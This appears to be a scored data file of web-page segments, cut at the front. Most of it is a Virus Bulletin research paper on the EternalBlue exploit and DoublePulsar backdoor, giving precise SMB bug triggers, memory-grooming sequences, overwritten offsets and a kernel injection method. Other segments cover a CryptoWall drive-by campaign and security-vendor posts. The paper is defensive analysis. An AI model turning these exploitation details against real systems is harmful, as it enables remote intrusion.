6a912512b218064baebbee416c5b3268",0.009277321486655055
"File size:
≈350KB",0.00818403155443781
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Ukrainian Media Site RBC[dot]UA Drops CryptoWall Ransomware
Popular news site rbc[dot]ua is currently hacked and infecting its visitors via the RIG exploit kit. The majority of the traffic to the site comes from Ukraine with over 6 million monthly visits, according to SimilarWeb.
This may sound familiar to some and it is indeed, as about a week ago Cyphort blogged about an identical incident.
Traffic flow",0.01586400594177728
The malicious iframe is present within a JavaScript file:,0.006602939375297434
"RIG exploit kit
Landing page:",0.007816273175262456
"Flash exploit:
CVE-2015-5122 (VT link) blocked by Malwarebytes Anti-Exploit:",0.007162668718846854
"Payload
The payload for this particular campaign is CryptoWall, a nasty strain of crypto ransomware that holds your files hostage. VT link.",0.013837548364699304
"You may have noticed that the URL for this payload is different than the one for the classic RIG EK. The domain and IP address (46.30.43.134) used for the landing page and Flash exploit are not the same for the dropped file (IP: 185.58.207.65).
Classic RIG EK:
Unusual RIG EK:
Security researcher @Kafeine originally spotted this behaviour and figured it was the exploit kit author robing his customer by launching his own payload.
We have reached out to the Ukrainian site to let them know about this attack and hope they can fix the problem to prevent further infections.
Malwarebytes Anti-Exploit users were already protected against this drive-by download attack.
",0.016573816395744956
New Zero-Day exploit – Astaro blocks that!,0.008139395748372857
"Dan Goodwin recently reported that a new Internet Explorer exploit has been released into the wild. The exploit, known as CVE-2010-0249, attacks a known vulnerability in Internet Explorer and was most notably used to compromise Google. Luckily, networks with an Astaro Security Gateway are protected against this threat.",0.010840863149508606
"Written by
Angelo Comazzetto",0.008855311348334505
"January 20, 2010",0.009590551599885533
Network up2date,0.007611986957109407
"Dan Goodwin recently reported that a new Internet Explorer exploit has been released into the wild. The exploit, known as CVE-2010-0249, attacks a known vulnerability in Internet Explorer and was most notably used to compromise Google.  Luckily, networks with an Astaro Security Gateway are protected against this threat.",0.010840863149508606
"Astaro is connected to the Microsoft Active Protection Program and therefore it is possible for the product’s IPS to recognize and block attacks before other vendors are able to do so.
According to the Goodwin article, this attack has been in existence and remained undetected for almost nine years.  Obviously this attack is ""highly sophisticated"" and the only reason we are aware of the exploit now is because a very prominent company (Google), was targeted and compromised.  It is important to note that Internet Explorer version 8 and Windows 7 were both able to withstand this attack- once again confirming the importance of updating your software.
Microsoft is encouraging Internet Explorer users to upgrade version 8, a move that will help protect users from other known vulnerabilities. I believe the Google compromise is just the tip of the iceberg. Just because we are now aware of this exploit does not mean all networks and systems are fixed. Now that the vulnerability in Internet Explorer has been publicized we can expect more attacks looking to take advantage of the vulnerability until a patch is made.
The next patch is scheduled for February 9th, however there is speculation a patch may be issued prior to the scheduled patch date. A final thought about this exploit is how it transcends international borders. The cyber-criminals who created this exploit are from China but used the global reach of Internet Explorer to gain access to email accounts of users who trust Google from all over the world. We truly live in a global world.",0.01641002711469408
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
EternalBlue: a prominent threat actor of 2017–2018,0.011527069252736055
"Pradeep Kulkarni, Sameer Patil, Prashant Kadam & Aniruddha Dolas",0.016450082147568712
"Quick Heal Security Labs, India",0.00937523190061229
Copyright © 2018 Virus Bulletin,0.009633121006031975
"Table of contents
Introduction Shadow Brokers Group MS17-010 Fuzzbunch EternalBlue SMB transactions The FEA_LIST format conversion Root cause analysis in srv.sys Kernel NonPagedPool grooming Creating a hole for NTFea list allocation Exploit complete sequence DoublePulsar DoublePulsar execution flow SYSENTER routine hook Finding ntoskrnl.exe and resolving its exports QueueUserAPC injection from kernel to user address space Statistics Other exploits affecting Windows EternalChampion EternalRomance EmeraldThread ErraticGopher EskimoRoll EducatedScholar EternalSynergy EclipsedWing EnglishmanDentist EsteemAudit ExplodingCan References",0.010658853041890515
Introduction,0.012036720276026314
"Last year, the cybersecurity world was abuzz with news of what became the infamous and widespread WannaCry ransomware attack. The campaign started shortly after the disclosure of a series of National Security Agency (NSA) exploits by the Shadow Brokers hacker group. Taking advantage of unpatched systems all over the globe, the WannaCry attack, which used an exploit known as 'EternalBlue', spread across 150 countries.",0.015217561488093057
"The infamous Shadow Brokers hacker group has been active since 2016 and has been responsible for leaking several NSA exploits, zero-days and hacking tools.",0.019735041308638457
"According to Wikipedia, five leaks by the Shadow Brokers group have been reported to date. The fifth leak, which happened on 14 April 2017, proved to be the most damaging. On the same day, Microsoft issued a blog post outlining the available patches that already addressed the exploits that had been leaked by Shadow Brokers. A month prior to the leak (14 March 2017), Microsoft had issued Security Bulletin MS17-010, which addressed some of the unpatched vulnerabilities, including those used by the 'EternalBlue' exploit. However, many users did not apply the patch, and on 12 May 2017 were hit by the biggest ransomware attack in history – the WannaCry attack.",0.01664212826572553
"WannaCry gained worldwide attention after it managed to infect more than 230,000 computers in more than 150 countries. High-profile organizations including hospitals and telecom, gas, electricity and other utility providers worldwide were the main casualties of the attack. Not long after the WannaCry outbreak, other serious attacks occurred which were also found to be using EternalBlue and other exploits and hacking tools from the same NSA leak. These included the EternalRocks worm, the Petya a.k.a NotPetya ransomware, and the BadRabbit ransomware.",0.022804864814953252
"Cryptocurrency mining campaigns were also seen using the exploits leaked by Shadow Brokers to spread to other machines. These included Adylkuzz, Zealot and WannaMine.",0.016142913183090246
"The fifth Shadow Brokers NSA leak contained 30 exploits and seven hacking tools/utilities in total, which were integrated into an exploit framework named 'Fuzzbunch'. Fuzzbunch was like any other exploit framework, with a sophisticated command line interface (CLI). Using this CLI an attacker could launch any exploit against a targeted entity. Of the 30 exploits, 12 affected the Windows platform: 'EternalBlue', 'EmeraldThread', 'EternalChampion', 'ErraticGopher', 'EskimoRoll', 'EternalRomance', 'EducatedScholar', 'EternalSynergy', 'EclipsedWing', 'EnglishmanDentist', 'EsteemAudit' and 'ExplodingCan'. Fuzzbunch also contained a sophisticated shellcode called 'DoublePulsar', which opens a backdoor in the victim's system and can be used to launch any malware attack on the infected machine.",0.016922534171633585
"This paper outlines the use of the Fuzzbunch exploit framework, details of the MS17-010 patch, and insights into the EternalBlue exploit and DoublePulsar payload. In addition, it puts together some detection statistics of the EternalBlue exploit from its inception in May 2017 to date.",0.013448508115556979
Shadow Brokers Group,0.01077305635901471
"The Shadow Brokers group is famous for NSA leaks containing exploits, zero-days and hacking tools. The first known leak from this group was in August 2016. After the most recent leak, the Shadow Brokers group altered its business model and started paid subscription. Of all the public leaks made by the group, it was the fifth one – which included the EternalBlue exploit used in many cyber attacks – that made history.",0.014852790279520911
MS17-010,0.009375764030588263
"On 14 March 2017, Microsoft patched several of the vulnerabilities exploited by the Shadow Brokers leak and advised its users to update their systems with the MS17-010 patch. Table 1 below shows the exploits addressed by Microsoft.",0.017347164875301746
Exploits,0.006498191279907806
Security Bulletin/CVE,0.01057831825978306
EternalBlue,0.008556871058112536
MS17-010,0.009375764030588263
EmeraldThread,0.008828365126737348
MS10-061,0.008600068975177289
EternalChampion,0.007946643518114804
MS17-010,0.009375764030588263
ErraticGopher,0.01067939350677305
CVE-2017-8461,0.009778825898766663
EskimoRoll,0.008535438738685674
MS14-068,0.009002638364183246
EternalRomance,0.008162878860487388
MS17-010,0.009375764030588263
EducatedScholar,0.008215609203042096
MS09-050,0.009455504367393286
EternalSynergy,0.009040667780214173
MS17-010,0.009375764030588263
EclipsedWing,0.009140198167900015
MS08-067,0.008123350220253345
Table 1: The exploits addressed by Microsoft.,0.014769207320278643
"The 'EnglishmanDentist' (CVE-2017-8487), 'EsteemAudit' (CVE-2017-0176) and 'ExplodingCan' (CVE-2017-7269) exploits are only reproducible on certain Windows operating systems that are no longer supported by Microsoft. Users of these systems were urged to upgrade their operating systems to those supported by Microsoft.",0.01059549966178941
Fuzzbunch,0.008770404460930359
"Fuzzbunch is just like any other exploit framework. It has an intuitive command line interface (CLI) that can be used to navigate through various exploits and settings. The framework was coded with Python 2.6 and uses an old version of PyWin32: v2.12. To launch the framework, one must execute the script fb.py, as shown in Figure 1 below.",0.012817450829903598
Figure 1: Launching Fuzzbunch.,0.01739845160106468
"Various parameters, such as target IP address, OS details, etc., are required to launch an attack. These details can be saved with project names for reuse. Figure 2 shows the available exploits in Fuzzbunch.",0.009028931924027428
Figure 2: List of the Fuzzbunch exploits.,0.012757334639916351
"To launch the EternalBlue exploit, we need to issue the 'use Eternalblue' command in the Fuzzbunch CLI, as shown in Figure 3. The configurations that have already been entered are displayed. To execute the EternalBlue exploit, the 'execute' command must be issued.",0.015257793229742078
Figure 3: Use of the EternalBlue exploit in Fuzzbunch.,0.01572006685617855
"Upon successful execution of the exploit, the messages shown in Figure 4 are displayed on the CLI.",0.009656171987328932
Figure 4: Messages displayed following successful execution of the EternalBlue exploit.,0.02063154644971521
"In order to execute the DoublePulsar shellcode, the 'use Doublepulsar' command needs to be issued, as shown in Figure 5.",0.013849060138284908
Figure 5: Executing the DoublePulsar backdoor in Fuzzbunch.,0.014615409562069415
"Depending on the targeted machine, a few more configurations are required, as shown in Figure 6.",0.009998940512255472
Figure 6: DoublePulsar backdoor options list.,0.01764099032201949
"The DoublePulsar payload asks which operations it is required to perform. The available operations are: OutputInstall (dump shellcode), Ping, RunDLL, RunShellcode and Uninstall.",0.010276849683076295
"Upon successful execution of DoublePulsar, the messages shown in Figure 7 are displayed on the CLI.",0.009790736565563507
Figure 7: DoublePulsar backdoor implant successful.,0.010172222846261736
EternalBlue,0.008556871058112536
"EternalBlue exploits a remote code execution vulnerability in Windows SMB. It utilizes three SMB-related bugs and an ASLR bypass technique in its exploitation. It performs a kernel NonPagedPool buffer overflow using two of these bugs and utilizes the third bug to set up the kernel pool grooming required to orchestrate the buffer overwrite on another known kernel structure. This overflow, along with the ASLR bypass, helps place the shellcode at a predefined executable address. This allows the attackers to launch a remote code execution on vulnerable victims' machines.",0.008896718161104822
"EternalBlue exploits a victim machine's vulnerable SMB by sending crafted SMB packets over multiple TCP connections. In the first TCP connection, it opens a null session through an anonymous login on IPC$ share. If the response from the victim's computer is STATUS_SUCCESS, the exploit begins its operation by sending an SMB NT Trans request with the 'TotalDataCount' DWORD field set as 66512. NT Trans corresponds to the SMB_COM_NT_TRANSACT transaction subprotocol and is one of the six types of transaction subprotocols available.",0.014436082172430864
SMB transactions,0.009656133143166157
"As per MSDN, 'the Transaction SMB commands are generic operations. They provide transport for extended sets of subcommands which, in turn, allow the CIFS client to access advanced features on the server. CIFS supports three different transaction messages, which differ only slightly in their construction':",0.016656098992679058
SMB_COM_TRANSACTION     (or Trans),0.015748931751444983
SMB_COM_TRANSACTION2   (or Trans2),0.015957822172702252
SMB_COM_NT_TRANSACT     (or NT Trans),0.014212064659816392
"After the first NT Trans request, the exploit sends multiple Trans2 Secondary (SMB_COM_TRANSACTION2_SECONDARY) requests with the 'TotalDataCount' WORD field set as 4096. The '_SECONDARY' subcommands are used when the message payload is big and has to be split across multiple SMB transactions.",0.014384682528804205
"In an ideal situation, if the payload can't be accommodated in one SMB_COM_NT_TRANSACT packet, the rest of the payload is sent through SMB_COM_NT_TRANSACT_SECONDARY packets. Similarly, SMB_COM_TRANSACTION2_SECONDARY requests are used when the primary request packet is of type SMB_COM_TRANSACTION2.",0.01352278812605967
EternalBlue uses the incorrect sequence of packets (SMB_COM_NT_TRANSACT -> SMB_COM_TRANSACTION2_SECONDARY) to exploit the parsing bug (bug 2) in srv.sys.,0.009944917406612297
"This bug exists because srv.sys incorrectly maps the received multiple transaction packet types as per the SMB command value set in the last packet of the sequence. Hence, even though the transaction is initiated with the NT Trans request, in the end the whole transaction is mapped as a Trans2 request type because that's the value set in the last packet. Furthermore, if we compare the two structures, we notice that the 'TotalDataCount' value field is DWORD in NT Trans and WORD in Trans2 requests.",0.012620653939096838
Figure 8: Comparison of NT Trans and Trans2 structures.,0.014742628834856997
"Hence, this bug made it possible to send a payload in Trans2 requests that is bigger than the limit of 65535(0xffff).",0.012877025625566474
The FEA_LIST format conversion,0.006361259292105181
The payload present in the above transaction request packets is a big SMB_FEA_LIST which is nothing but a concatenated list of SMB_FEA structures in OS2 format. 'FEA' stands for 'Full Extended Attribute' and contains information related to files in name/value attribute format.,0.010953130307953862
Figure 9: Structure of FEA_LIST.,0.013118666137268753
"In the payload, the SizeOfListInBytes is the first field of the list structure with a value set as 0x10000. Then there are 607 crafted SMB_FEA structures appended one after another, the total size of which is a little more than 0x10000 bytes (see Figure 10).",0.015976953584755038
Figure 10: NT Trans request packet containing OS2FeaList.,0.012329744644832497
"As seen in Figure 11, the first 605 structures are empty, each occupying five bytes in the list. The second last structure is of size (0xf383 + 5) bytes, while the last structure in the list is of size (0xa8 + 5) bytes. After 607 structures, there is some appended garbage data which keeps the request packet confined to a particular size.",0.013605821804874463
Figure 11: Records in OS2FeaList.,0.012469107356364306
"When the FEA list is sent in OS2 format, since OS2 is an outdated format, it is converted to the currently used NT format by the srv.sys driver. However, while parsing the FEA list to convert it into NtFeaList, there is a bug (bug 1) consisting of a wrong type casting a WORD into a DWORD. Let's have a look at both the structures involved here (Figure 12).",0.011193123611712985
Figure 12: SMB_FEA_List vs NtFeaList structure.,0.014541949903124074
"As mentioned in MSDN, 'The SMB_FEA data structure is used in Transaction2 subcommands and in the NT_TRANSACT_CREATE subcommand to encode an extended attribute (EA) name/value pair'. Hence, it's clear that the parsing bug that we saw earlier specifically allowed SMB_FEA_LIST to be sent with size > 0xffff, which is not possible through normal Transaction2 subcommand requests.",0.012171347362902374
Root cause analysis in srv.sys,0.006329781106694354
The NtFea conversion takes place in the srv!SrvOs2FeaListToNt function as soon as the whole structure is received from the last Trans2 request packet. SrvOs2FeaListToNt calls srv!SrvOs2FeaListSizeToNt to parse each structure and calculate the total size required for the new structure. It doesn't validate the contents of the source list but it does check each FEA structure to make sure its length is not out of bounds of the length defined initially in the SizeOfListInBytes field (0x10000 in this case).,0.01610432431877662
"After parsing 606 FEA structs, the total offset length of structs parsed becomes 0xff59 bytes. Since the last FEA is of size 0xad, it results in a length value that is out of bounds by 10 bytes. Hence, as shown in Figure 13, it comes out of the WHILE loop, discards the 607th record along with the remaining appended garbage data, and finally updates the Os2FeaList‑>SizeOfListInBytes value in a buggy form, as shown in Figure 14.",0.01340701537050637
Figure 13: srv!SrvOs2FeaListSizeToNt pseudocode.,0.013071612766730634
Figure 14: SizeOfListInBytes updated value.,0.013422480933091285
"The corrected size is updated in LOWORD bytes of the DWORD variable, thereby increasing its value instead of decreasing it. SrvOs2FeaListToNt gets the returned final calculated sizes of the NtFea list and the updated Os2Fea list, and allocates memory in NonPagedPool for the NtFea list. For each FEA record to be converted, it calls srv!SrvOs2FeaToNt to copy the contents using memmove(), which continues until the end of the last FEA record.",0.013026939671831439
"The NtFea size allocated is 0x10fe8 bytes, but as shown in Figure 15, there is an overwrite of 0xb1 bytes. If the overwrite is completed successfully, the function returns with the status 0xC000000D, as shown in Figure 16.",0.012191397682666527
Figure 15: NtFeaList out of bound write operation.,0.01399083680281421
Figure 16: SrvOs2FeaListToNt return status.,0.012501924439430545
"The victim's machine then sends a Trans2 response packet to the server with NT Status value returned from the SrvOs2FeaListToNt function, which is 0xC000000D, signifying that the overwrite was successful (Figure 17).",0.014238127059566508
Figure 17: STATUS_INVALID_PARAMETER response status for successful overwrite.,0.012091466376074944
Kernel NonPagedPool grooming,0.009078410231604384
"The overflow which we saw above is well orchestrated on an SRVNet chunk which contains the SRVNET_BUFFER_HDR structure. By using some kernel pool grooming, it is ensured that the SRVNet chunk is placed right after the end of the allocation of the converted NtFea list. Hence, after the overflow, it is expected to overwrite two of its important fields, allowing ASLR bypass and finally making EIP point to shellcode.",0.010854342016457408
"EternalBlue opens multiple new TCP connections to send SMBv2 packets, which causes srvnet.sys to allocate SRVNET_BUFFER_HDR chunks at the NonPagedPool pool. Multiple packets are sent to fill up the fragmented spaces in NonPagedPool, thereby increasing the chances of groom packets sent after this being allocated at the required location. Figure 18 shows an overwritten SRVNet chunk.",0.01205874771312454
Figure 18: Overwritten SRVNet chunk.,0.015230531648227852
The fields overwritten in the SRVNET_BUFFER_HDR structure are:,0.009580978797978812
"pSrvNetWskStruct: located at offset 0x58 bytes from the start of the header, this points to the SrvNetWskStruct object which is of type SRVNET_RECV.",0.010055249457330606
"pMdl1: located at offset 0x38, this is a pointer to MDL. The operating system uses a memory descriptor list (MDL) to describe the physical page layout for a virtual memory buffer.",0.009000874536752579
"Both the fields are overwritten to the same virtual address, 0xfffdf100, which is the HAL heap address in 32-bit Windows 7. This ASLR bypass trick ensures that the next SMB2 headers to be received will be placed in the statically defined HAL heap address instead of in the usual NonPagedPool. So, from all the NumGrooms connections, only the allocation where the SRVNet chunk was overwritten causes allocation in the HAL heap. A payload comprising a fake SRVNET_RECV structure appended with shellcode is then sent with the SRVNET_RECV‑>HandlerFunction field value set to the shellcode address. Immediately after sending the payload, all NumGrooms connections are closed, causing the target handler function to be called and triggering the shellcode execution.",0.012107658131258137
Creating a hole for NTFea list allocation,0.006703704994787341
"Spraying multiple groom packets is just one part of the grooming process. The other part involves creating a hole exclusively for NTFea list allocation. For this, a request format parsing confusion bug (bug 3) is used, in which a small SMB_COM_SESSION_SETUP_ANDX request packet makes a large NonPagedPool allocation of 0x11000 bytes.",0.010113955952889775
An SMB connection typically uses the SMB_COM_SESSION_SETUP_ANDX request to begin user authentication and establish an SMB session. Figure 19 shows two format structures associated with SMB_COM_SESSION_SETUP_ANDX where the parsing confusion bug exists.,0.009406152001939172
Figure 19: NT Security request format vs Extended Security request format.,0.015200331577587378
"The two different formats have different WordCount field values, as mentioned above. Also, the ByteCount field is at offset 0x1B in NT Security request format and at 0x19 in Extended Security request format.",0.011424438324340924
"According to the bug, if an SMB_COM_SESSION_SETUP_ANDX request is sent as Extended Security (WordCount 12) with (Flags2->Extended_Security_Negotiation = 0) and (Capabilities->Extended_Security = 1), then the request will be wrongly processed as an NT Security request (WordCount 13). Hence the ByteCount field value is parsed from the wrong offsets, which causes allocation of the wrong sized buffer in NonPagedPool. Two allocations are made using this bug in this exploit: the first time in the Pre-Hole connection and then later in the Hole connection.",0.014100199396992696
SMB connection name,0.008474162607730817
Original ByteCount value,0.008954214413010697
Wrongly parsed ByteCount value,0.007680984089780574
Allocation size requested,0.00900246637322999
Allocated size,0.008395698859599787
Pre-Hole connection,0.009907688461727182
0x16,0.00790424174333082
0xfff0,0.008759079370495693
0xffeb,0.008284765990408505
0x10000,0.008497366081152702
Hole connection,0.0074298518184607865
0x16,0.00790424174333082
0x87f8,0.007637127237449248
0x10fec,0.007791156604540106
0x11000,0.008221432705363907
The Hole connection is closed just before the NTFea list allocation is initiated so that the freed up space of 0x11000 bytes is taken up by the NTFea list.,0.009041760666927079
"The role of the Pre-Hole connection is not significant in the exploit, but it is probably intended to deal with other small allocation requests the memory allocator may receive in the short time interval between freeing the hole allocation and making a new allocation for the NTFea list.",0.010620801837899485
"An interesting thing about this exploit is that all four types of NonPagedPool allocations (NTFea list, Pre-Hole connection, Hole allocation and NumGrooms allocation) are huge allocations of 0x10000 and 0x11000 bytes. Because of these large allocation sizes, the allocations are mostly contiguous in kernel NonPagedPool and hence the chances of exploitation are very high, even in multiple attempts.",0.01202382914044342
Exploit complete sequence,0.007126834626235867
Table 2 shows the exploit's complete sequence of allocations; Figure 20 shows how it looks in kernel NonPagedPool memory.,0.01406858781277509
#TCP stream,0.009059061656017997
Connection name,0.008609242335556155
Details,0.01465924441948152
0,0.00817816293997986
Overflow,0.009317993572594663
Send a malformed OS2FeaList through multiple NT Trans and Trans2 secondary requests with the exception of the last Trans2 secondary request. The FEA list is stored at the paged pool memory of the kernel. An echo request packet is sent to keep the TCP connection open.,0.010369664927858846
1,0.011966970221767848
Pre-Hole,0.012440219556775767
"Send a malformed SMB_COM_SESSION_SETUP_ANDX request, which causes allocation of 0x10000 bytes in NonPagedPool.",0.012055316105273772
2 - 14,0.009322444318798029
NumGrooms,0.008783251489539179
"Open multiple SMB2 connections, each causing the allocation of SRVNet chunks of size 0x11000 bytes in NonPagedPool. The purpose is to fill up the fragmented memory areas that may exist in kernel memory.",0.009500122907605157
15,0.01315885936383332
Hole,0.01031259142709351
"Send a malformed SMB_COM_SESSION_SETUP_ANDX request, which causes allocation of 0x11000 bytes in NonPagedPool. This acts as a placeholder for the target NTFea list allocation responsible for overflow.",0.008934354893524454
1,0.011966970221767848
Pre-Hole,0.012440219556775767
Close the Pre-Hole connection. Free up the allocation to handle unexpected memory allocations from other processes.,0.010672837445587002
16 - 20,0.010410784268880091
NumGrooms,0.008783251489539179
Five new connections are made. One of them is expected to be allocated right next to the Hole allocation.,0.013601706032689398
15,0.01315885936383332
Hole,0.01031259142709351
Close the Hole connection. Free the target memory of the Hole allocation.,0.013508203367901261
0,0.00817816293997986
Overflow,0.009317993572594663
"Send the last Trans2 secondary request packet to complete the OS2Fea list. Srv.sys converts the OS2Fea list to NTFea format by calculating the wrong size of the converted list. The NTFea list's calculated value is 0x10fe8, which causes allocation of 0x11000 bytes.
Windows
memory allocators usually work in last-in-first-out fashion. Hence the recently freed Hole allocation is the one allocated for the NTFea list. The overflow modifies some of the fields of corresponding SRVNet chunks.",0.014397491893804903
"2 - 14
and 16 - 20",0.013842346584014176
NumGrooms,0.008783251489539179
Send fake SRVNET_RECV + shellcode from each NumGrooms connection. The overflow SRVNET header containing the connection will result in allocation in the HAL heap.,0.008180764091731407
"2 - 14
and 16 - 20",0.013842346584014176
NumGrooms,0.008783251489539179
"All NumGrooms connections are closed, triggering shellcode execution.",0.011582553245857996
Table 2: Exploit complete sequence.,0.012973413577531456
Figure 20: EternalBlue exploit complete sequence.,0.02562000567466005
The details of the mentioned shellcode and the DoublePulsar backdoor are described in the next section.,0.012835208451619895
DoublePulsar,0.007501426018243773
"DoublePulsar is a backdoor implant functionality which played a vital role in infecting thousands of systems with ransomware, cryptominers and other malware during 2017. Once DoublePulsar was implanted by the EternalBlue exploit, it opened up a backdoor, which in turn was used by attackers to deploy secondary malware onto victims' systems.",0.01372838161569212
"Upon successful execution of the EternalBlue exploit, DoublePulsar is used to achieve persistence on the victim's machine. This section describes how persistence is achieved. EternalBlue sends 18 grooming packets, all of which have similar first-stage shellcode which is sprayed inside the HAL's heap address. This is similar to the heap spray mechanism which is generally used in user-mode exploits. Through the Fuzzbunch CLI, it's very easy to use DoublePulsar to inject custom shellcode or malicious DLLs from kernel-mode to user-mode processes. This is achieved using the QueueUser asynchronous procedure call (APC).",0.013523023341211915
"As per MSDN, 'An asynchronous procedure call (APC) is a function that executes asynchronously in the context of a particular thread. When an APC is queued to a thread, the system issues a software interrupt. The next time the thread is scheduled, it will run the APC function. An APC generated by the system is called a kernel-mode APC. An APC generated by an application is called a user-mode APC. A thread must be in an alertable state to run a user‑mode APC.'",0.02100191348296565
DoublePulsar execution flow,0.006818890791403076
There are three steps involved in the DoublePulsar implant and execution.,0.015184868401854512
SYSENTER routine hook,0.00867509861464355
Find ntoskrnl.exe and resolve its exports,0.010376470514253167
QueueUserAPC injection from kernel to user address space,0.007177689743764093
SYSENTER routine hook,0.00867509861464355
"The SYSENTER routine hook is used to make the transition from user- to kernel-mode faster than by using the 'int 0x2e' instruction. When the SYSENTER instruction is executed, the values of the Model-Specific Register (MSR) are populated in its relative registers, ESP and EIP. During this process, the value of the IA32_SYSENTER_EIP register is stored in EIP (Figure 21).",0.017418548647968657
Figure 21: SYSENTER routine hook.,0.020391492567143232
"The shellcode overwrites the MSR to hook SYSENTER routines. In 32-bit systems, hooking is achieved by overwriting IA32_SYSENTER_EIP; in x64-bit systems it is achieved by overwriting IA32_LSTAR MSR.",0.012163827342910882
"In a normal scenario, the MSR register, i.e. IA32_SYSENTER_EIP, holds the address of the nt!KiFastCallEntry routine, but after the hook is added it points to the second part of the shellcode.",0.01789342996005061
Finding ntoskrnl.exe and resolving its exports,0.009762533110779903
"Once the address of nt!KiFastCallEntry has been overwritten, the execution flow moves to a second-stage shellcode. It first identifies the system architecture and locates the Interrupt Descriptor Table (IDT) from the Kernel Process Control Region (KPCR) and then traverses backwards in memory to identify the base address of ntoskrnl.exe.",0.018585028482286936
"As shown in Figure 22, fs:[38h] points to the IDT in KPCR and there is a function pointer at offset 6 of the KGDTENTRY structure which points to the interrupt handler present in ntoskrnl.exe. After it gets into the address space of ntoskrnl.exe, it traverses backwards by incrementing 0x1000 until it finds a DOS MZ header (0x4d5a).",0.0240169123616909
Figure 22: Finding the ntoskrnl.exe base address and resolving its exports.,0.02131678825640204
The shellcode further identifies the export table of ntoskrnl.exe and resolves the addresses of the required functions by using a custom hashing algorithm. It resolves three functions from ntoskrnl.exe's export table:,0.014937993150793472
ExAllocatePool,0.01127641642969468
ExFreePool,0.01128304001947944
ZwQuerySystemInformation,0.008148734403765512
"Here, the ExAllocatePool function is used to allocate memory into which third-stage shellcode is copied, and ExFreePool is used to free the allocated memory.",0.011373011392729171
"The ZwQuerySystemInformation function is used to find a list of loaded drivers in the system. The shellcode searches for the SMB driver (srv.sys) in the driver list. Once it finds the srv.sys driver, it traverses the sections of it to reach the .data section and finds the SrvTransaction2DispatchTable, which stores the addresses of SMB functions. It overwrites the address of the SrvTransactionNotImplemented function which is present at the 14th index in the SrvTransaction2DispatchTable. The third stage of shellcode, which performs the backdoor functionality, is stored at this address (see Figure 23).",0.015341882378454685
Figure 23: Overwriting SMB function address with shellcode.,0.015133167161687222
QueueUserAPC injection from kernel to user address space,0.007177689743764093
"The initial Trans2 SESSION_SETUP request is sent to the victim machine to identify whether or not the backdoor is present. As a response, a STATUS_NOT_IMPLEMENTED message is received, which includes 'Multiplex ID'. Generally, the Multiplex IDs in requests and responses are the same, but the backdoor returns a different Multiplex ID in response. This indicates whether or not the system is infected with the DoublePulsar backdoor. For example, in the initial Trans2 SESSION_SETUP request, Multiplex ID 0x41 (65) is sent and the infected system responds with Multiplex ID 81 (0x51) (see Figure 24).",0.013758387986290144
Figure 24: STATUS_NOT_IMPLEMENTED status to indicate the backdoor is installed.,0.011023121617150244
"DoublePulsar sends a last-stage shellcode, which performs a QueueUserAPC injection, along with the payload (DLL/another shellcode) in a Trans2 SESSION_SETUP request. Both shellcode and DLL are encrypted using an XOR key (Figure 25).",0.014376105305950682
Figure 25: Trans2 request where encrypted shellcode and payload is sent.,0.016091905937997142
This shellcode again identifies the ntoskrnl.exe base address and resolves its exports in the same way as the second-stage shellcode. Figure 26 shows a list of resolved APIs from ntoskrnl.exe which are used in the QueueUserAPC DLL injection technique.,0.015074443625468503
Figure 26: List of resolved APIs for QueueUserAPC DLL injection.,0.014103970731645266
"The kernel-mode-to-user-mode DLL injection begins by calling nt!PsGetCurrentProcess to get the address of the EPROCESS structure. EPROCESS->ActiveProcessLinks is parsed to get the EPROCESS structure of the target process. The target process in which injection is to be done was specified by the user earlier while executing DoublePulsar. Then, the nt!PsGetCurrentThread API is called to get the pointer of the ETHREAD structure. The ETHREAD structure is again parsed to find any alertable thread present in the process. Once the target thread is found, memory is allocated for APC and for a Memory Descriptor List (MDL) to map the supplied user-mode DLL. These two allocations are made using the nt!ExAllocatePool and nt!IoAllocateMdl APIs. The allocated address space for the MDL is given write access through the nt!MmProbeAndLockPages API. The DLL is then attached to the target process's address space using nt!KeStackAttachProcess. Once it is attached, nt!MmMapLockedPages is called to map the allocated MDL pages where the DLL payload is located. In the final step, the APC structure is initialized through nt!KeInitializeApc and APC is queued using nt!KeInsertQueueApc. This ensures that the DLL is scheduled for execution.",0.01645363052921034
"In the DoublePulsar cleanup process, the nt!KeUnstackDetachProcess and nt!ObDereferenceObject APIs are called to clean up the memory and avoid any crashes.",0.012713610040647083
Statistics,0.010114094249701555
"Quick Heal Security Labs observed the first EternalBlue detections in May 2017 when the WannaCry ransomware outbreak began. The detection count gradually increased as WannaCry started spreading to other computers. Also, in the month of May 2017, the EternalRocks worm used NSA leaked exploits to spread across the network. At the end of June, the Petya ransomware attack was observed.",0.015948707566711295
Figure 27: EternalBlue detection statistics.,0.020706636636467657
"During this period, many new POC/exploits using EternalBlue were discovered on the Internet. These readily available POC/exploits made it easy for attackers to change them according to their use case and to launch new attacks. We observed a rise in detections as EternalBlue was used in many such campaigns.",0.013047928357589722
"In mid-November, another global ransomware outbreak was observed: the BadRabbit ransomware. BadRabbit targeted many machines and spread using EternalBlue and other NSA exploits.",0.02645328398793856
"While ransomware outbreaks were causing havoc, we also observed many cryptominer campaigns integrating NSA exploits, in particular EternalBlue, for launching distributed mining attacks. Using EternalBlue, these cryptominers spread through multiple systems and started CPU mining. Thus, there was a steep rise in EternalBlue detections, which still continues.",0.013647090529517292
Other exploits affecting Windows,0.007527218639933331
"In addition to EternalBlue, the exploits listed below were also part of the leak which affected the Windows platform:",0.010828679350436743
EternalChampion,0.007946643518114804
